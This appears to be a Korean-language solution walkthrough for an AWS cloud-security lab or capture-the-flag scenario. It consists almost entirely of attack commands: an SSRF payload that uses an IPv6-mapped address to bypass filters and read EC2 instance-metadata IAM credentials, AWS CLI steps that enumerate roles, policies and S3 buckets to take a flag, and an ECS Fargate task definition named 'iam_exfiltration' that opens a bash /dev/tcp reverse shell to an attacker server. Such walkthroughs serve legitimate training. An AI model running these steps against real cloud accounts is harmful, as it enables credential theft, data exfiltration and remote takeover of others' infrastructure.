※ 웹 페이지가 먼저 주어짐.

# 실패(Easy) 시나리오 
### ssrf를 이용하여 ec2에 부여되어있는 자격증명을 조회 ( 아래와 같이 우회 필요 )
add your ec2 ip/?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/new_ecs_scenario_s3_role

### 자격증명 등록
aws configure --profile attacker
echo "aws_session_token = {얻은 토큰값}" >> ~/.aws/credentials

### 등록한 사용자에 대한 정보 확인하기 → 역할 이름 확인가능
aws --profile attacker sts get-caller-identity

### role 정보 확인
aws --profile attacker iam get-role --role-name new_ecs_scenario_s3_role
#-> arn:aws:iam::173258975867:role/new_ecs_scenario_s3_role (어디 적어놓으세요 나중에 쓰입니다. )

### 부여된 역할에 대한 정책 확인 ( 관리 정책 확인 ) → S3FullAccess
aws --profile attacker iam list-attached-role-policies --role-name new_ecs_scenario_s3_role

### 부여된 역할에 대한 정책 확인 ( 인라인 정책 확인 ) → new_ecs_scenario_policy
aws --profile attacker iam list-role-policies --role-name new_ecs_scenario_s3_role

### 인라인 정책에 대한 퍼미션 확인.
aws --profile attacker iam get-role-policy --role-name new_ecs_scenario_s3_role --policy-name new_ecs_scenario_policy

### s3 접근하여 플래그 들고오기.
aws --profile attacker s3 ls
aws --profile attacker s3 ls s3://ecs-scenario-bucket-abc123/
aws --profile attacker s3 ls s3://ecs-scenario-bucket-abc123/secret/
aws --profile attacker s3 cp s3://ecs-scenario-bucket-abc123/secret/flag.txt .

cat flag.txt

※ 이메일 확인


# 성공(Hard) 시나리오

### 존재하는 클러스터 확인
aws --profile attacker ecs list-clusters

### 클러스터 정보 확인하기.
aws --profile attacker ecs describe-clusters --clusters new_ecs_scenario_cluster

### 클러스터 내에서 돌아가고 있는 인스턴스 확인.
aws --profile attacker  ecs list-container-instances --cluster arn:aws:ecs:us-east-1:173258975867:cluster/new_ecs_scenario_cluster

### 작동하고 있는 인스턴스에 대한 자세한 정보 출력
aws --profile attacker ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:173258975867:cluster/new_ecs_scenario_cluster --container-instances arn:aws:ecs:us-east-1:173258975867:container-instance/new_ecs_scenario_cluster/2d3ed51ad04847dd894dc78e263adfb3

### ec2 인스턴스 조회
aws --profile attacker ec2 describe-instances --instance-ids i-0eb21dd38f6f099c2


※ 공격자는 개인 서버로 nc를 이용해 포트를 열고 리버스 쉘을 준비합니다.


### 리버스쉘 수행 작업 정의하기
aws --profile attacker ecs register-task-definition --family iam_exfiltration --task-role-arn arn:aws:iam::173258975867:role/new_ecs_scenario_s3_role --network-mode "awsvpc" --cpu 256 --memory 512 --requires-compatibilities "[\"FARGATE\"]" --container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/(add your server) 0>&1\\\"\"]}]"

### 사용할 수 있는 subnet 확인
aws --profile attacker ec2 describe-subnets   

### 정의한 작업 실행하기.
aws --profile attacker ecs run-task --task-definition iam_exfiltration --cluster arn:aws:ecs:us-east-1:173258975867:cluster/new_ecs_scenario_cluster --launch-type FARGATE --network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-0c73fcdbfb99c884b\"]}}"


[리버스 쉘 성공 시]
apt-get update
apt-get install awscli
aws s3 ls
aws s3 ls s3://ecs-scenario-bucket-abc123/
aws s3 ls s3://ecs-scenario-bucket-abc123/secret/
aws s3 cp s3://ecs-scenario-bucket-abc123/secret/flag.txt .
cat flag.txt

===================================================================
